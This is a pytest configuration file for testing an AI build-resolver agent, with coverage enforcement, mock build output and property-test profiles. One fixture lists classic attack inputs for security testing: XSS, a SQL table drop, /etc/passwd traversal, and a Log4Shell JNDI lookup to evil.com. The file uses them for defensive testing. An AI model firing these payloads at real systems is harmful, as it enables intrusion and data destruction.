"""
AI Agent Validator.md compliant test configuration for Never Fail Build Resolver.
Enforces ≥95% coverage and comprehensive validation patterns.
"""

import pytest
import os
import tempfile
from pathlib import Path
from typing import AsyncGenerator
from unittest.mock import patch, MagicMock

# Pydantic AI imports
from pydantic_ai import Agent
from pydantic_ai.models.test import TestModel
from pydantic_ai.models.function import FunctionModel
from pydantic_ai.messages import ModelTextResponse

# Coverage enforcement hook
def pytest_sessionfinish(session):
    """Enforce ≥95% coverage requirement per AI Agent Validator.md."""
    if hasattr(session.config, 'pluginmanager'):
        cov_plugin = session.config.pluginmanager.get_plugin('pytest_cov')
        if cov_plugin and hasattr(cov_plugin, 'cov_total'):
            if cov_plugin.cov_total < 95.0:
                raise Exception(f"Coverage {cov_plugin.cov_total}% < required 95% - Validation failed")

@pytest.fixture
def test_model_explicit():
    """Create TestModel with explicit agent_responses configuration."""
    model = TestModel()
    # Configure explicit responses to prevent false positives
    model.agent_responses = [
        ModelTextResponse(content="Never Fail Build Resolver configured for testing")
    ]
    return model

@pytest.fixture
def performance_thresholds():
    """Performance thresholds per AI Agent Validator.md."""
    return {
        "max_response_time": 10.0,  # seconds - build operations can be slower
        "max_memory_usage": 200,   # MB - build analysis can use more memory
        "max_startup_time": 3.0,   # seconds
    }

@pytest.fixture
def malicious_input_samples():
    """Sample malicious inputs for security testing."""
    return [
        "<script>alert('xss')</script>",
        "'; DROP TABLE build_results; --",
        "../../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "\x00\x01\x02\x03\x04\x05",
        "A" * 10000,  # Buffer overflow attempt
    ]

@pytest.fixture
def mock_build_output():
    """Mock build output for testing."""
    return """
[100%] Built target wire_ground_tests
make[2]: Leaving directory '/IdeaProjects/wire_ground/cmake-build-debug'
make[1]: Leaving directory '/IdeaProjects/wire_ground/cmake-build-debug'
make: Leaving directory '/IdeaProjects/wire_ground/cmake-build-debug'
"""

@pytest.fixture
def mock_build_errors():
    """Mock build errors for testing."""
    return """
error: 'undefined_function' was not declared in this scope
error: expected ';' before '}' token
CMake Error at CMakeLists.txt:25 (target_link_libraries):
  Target "test_target" does not exist.
"""

# Hypothesis settings for property-based testing
from hypothesis import settings
settings.register_profile("ci", max_examples=100, deadline=5000)
settings.register_profile("dev", max_examples=20, deadline=2000)
settings.load_profile("ci" if os.getenv("CI") else "dev")